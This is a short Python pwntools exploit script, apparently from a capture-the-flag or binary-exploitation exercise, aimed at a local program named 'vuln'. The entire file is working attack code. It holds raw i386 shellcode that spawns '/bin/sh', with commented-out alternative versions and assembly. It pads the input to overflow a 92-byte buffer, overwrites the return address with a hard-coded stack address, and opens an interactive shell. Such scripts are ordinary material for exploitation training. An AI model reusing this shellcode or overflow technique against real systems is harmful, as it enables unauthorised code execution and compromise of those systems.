from pwn import *

STACK_ADDRESS = 0xffffd0ac

#SHELLCODE = asm(shellcraft.i386.linux.sh())
#SHELLCODE = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
SHELLCODE= b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80"
#SHELLCODE = asm('''
#xor    eax, eax
#push   eax
#push   0x68732f2f
#push   0x6e69622f
#mov    ebx, esp
#push   eax
#push   eax
#push   ebx
#mov    ecx, esp
#mov    al, 0xb
#int    0x80
#''')
#
# 1: overwriter return address
print(len(SHELLCODE))
p = process("./vuln")
gdb.attach(p, '''
b *(vuln+95)

#c
''')

# p = gdb.debug('./vuln', f'''
# # break at main
# # break main

# # debug automatically breaks at _start - ignore it
# # continue
# ''')

exploit = b""
exploit += SHELLCODE
#exploit += ""

p.sendline(exploit + b"A"*(92 - len(exploit))+b"B"*4+p32(STACK_ADDRESS))

p.interactive()